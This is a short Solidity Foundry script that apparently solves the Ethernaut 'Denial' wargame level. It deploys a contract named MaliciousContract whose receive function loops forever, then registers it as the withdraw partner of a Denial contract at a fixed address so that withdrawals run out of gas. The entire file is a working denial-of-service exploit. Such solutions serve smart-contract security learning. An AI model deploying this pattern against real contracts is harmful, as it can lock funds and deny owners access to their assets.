// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MaliciousContract {
    receive() external payable {
        while(true) {

        }
    }
}

contract DenialSolution is Script {

    Denial public denialInstance = Denial(payable(0xb2D2dD76E95370e371A7E41ce3EAAD37ec292a9A));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address _partner = address(new MaliciousContract());
        denialInstance.setWithdrawPartner(_partner);
        // denialInstance.withdraw();

        vm.stopBroadcast();
    }
}